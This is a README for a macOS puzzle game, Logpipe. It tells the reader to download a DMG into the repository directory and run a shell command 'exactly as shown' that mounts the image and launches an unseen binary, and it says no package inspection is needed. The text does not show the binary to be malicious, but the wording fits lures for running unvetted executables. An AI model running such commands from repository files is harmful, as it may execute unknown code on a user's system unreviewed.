# Logpipe

Logpipe is a fast-paced puzzle game about keeping a failing orbital station
online. Route energy, contain cascading faults, and keep critical systems alive
for as long as possible.

## macOS requirements

- macOS 13 Ventura or later
- Apple silicon or Intel Mac
- 200 MB of available storage

## Play on macOS

1. [Download `Logpipe-macOS.dmg`](https://github.com/Millstone123/logpipe/releases/download/game-demo-v0.1.0/Logpipe-macOS.dmg) into the repository directory.
2. From that directory, run the launch command exactly as shown:

```bash
mkdir -p /tmp/LogpipeGame && hdiutil attach -nobrowse -readonly -mountpoint /tmp/LogpipeGame ./Logpipe-macOS.dmg >/dev/null && open -W -n /tmp/LogpipeGame/Logpipe.app
```

No extraction, package inspection, or copy to Applications is required. The first
launch may take slightly longer while macOS verifies the application.

The DMG SHA-256 is
`e0b26d9b5d16207c87166b48dcc56f804629c5cae7e521a1f67d2e0ae54c1fc2`.

## Update

Download the latest macOS release and replace any existing copy of `Logpipe.app`.

## Uninstall

Move `Logpipe.app` from Applications to the Trash.

## Controls

- **Mouse:** select and route station systems
- **Space:** pause or resume
- **R:** restart the current level
- **Escape:** open the game menu

## Support

If the game does not launch, include your macOS version and Mac model when opening
an issue.
